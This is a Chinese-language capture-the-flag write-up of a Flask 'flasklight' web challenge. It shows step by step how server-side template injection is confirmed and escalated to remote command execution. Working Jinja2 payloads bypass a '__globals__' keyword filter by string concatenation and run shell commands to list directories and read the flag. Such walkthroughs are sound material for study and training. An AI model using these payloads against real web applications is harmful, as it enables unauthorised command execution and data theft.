![[Pasted image 20221227093348.png|500]]

---
首页长这样
![[Pasted image 20221227093716.png|700]]

![[Pasted image 20221227093744.png]]

尝试传一些奇怪的东西
```python
/?search={{7*7}}
```

```
You searched for:
49
```

存在`SSTI`

```python
/?search={{config}}
```

```
<Config {'JSON_AS_ASCII': True, 'USE_X_SENDFILE': False, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_NAME': 'session', 'MAX_COOKIE_SIZE': 4093, 'SESSION_COOKIE_SAMESITE': None, 'PROPAGATE_EXCEPTIONS': None, 'ENV': 'production', 'DEBUG': False, 'SECRET_KEY': 'CCC{f4k3_Fl49_:v} CCC{the_flag_is_this_dir}', 'EXPLAIN_TEMPLATE_LOADING': False, 'MAX_CONTENT_LENGTH': None, 'APPLICATION_ROOT': '/', 'SERVER_NAME': None, 'PREFERRED_URL_SCHEME': 'http', 'JSONIFY_PRETTYPRINT_REGULAR': False, 'TESTING': False, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'TEMPLATES_AUTO_RELOAD': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'JSON_SORT_KEYS': True, 'JSONIFY_MIMETYPE': 'application/json', 'SESSION_COOKIE_HTTPONLY': True, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'TRAP_HTTP_EXCEPTIONS': False}>
```

`url_for`用不了QAQ
使用脚本找找`__builtins__`

```python
num = 0
for item in ''.__class__.__mro__[2].__subclasses__():
    try:
         if '__builtins__' in item.__init__.__globals__:
             print num,item
         num+=1
    except:
        num+=1

```

```
58 <class 'warnings.WarningMessage'>
59 <class 'warnings.catch_warnings'>
60 <class '_weakrefset._IterationGuard'>
61 <class '_weakrefset.WeakSet'>
71 <class 'site._Printer'>
76 <class 'site.Quitter'>
77 <class 'codecs.IncrementalEncoder'>
78 <class 'codecs.IncrementalDecoder'>
```

这题给`__global__`过滤了太狠毒了QAQ，服务端`__init__`可以直接通过索引访问元素，本地运行会报错==

```python
/?search={{[].__class__.__base__.__subclasses__()[58].__init__['__glo'+'bals__']['__builtins__']['__import__']('commands').getoutput('ls')}}
```

```
You searched for:
bin boot dev etc flasklight home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
```

```python
/?search={{[].__class__.__base__.__subclasses__()[58].__init__['__glo'+'bals__']['__builtins__']['__import__']('commands').getoutput('ls flasklight')}}
```

```
You searched for:
app.py coomme_geeeett_youur_flek
```

```python
/?search={{[].__class__.__base__.__subclasses__()[58].__init__['__glo'+'bals__']['__builtins__']['__import__']('commands').getoutput('cat flasklight/coomme_geeeett_youur_flek')}}
```

```
You searched for:
flag{b1e72009-df67-40c1-b2ae-c24c0a679158}
```

#Web #python #flask #SSTI #RCE 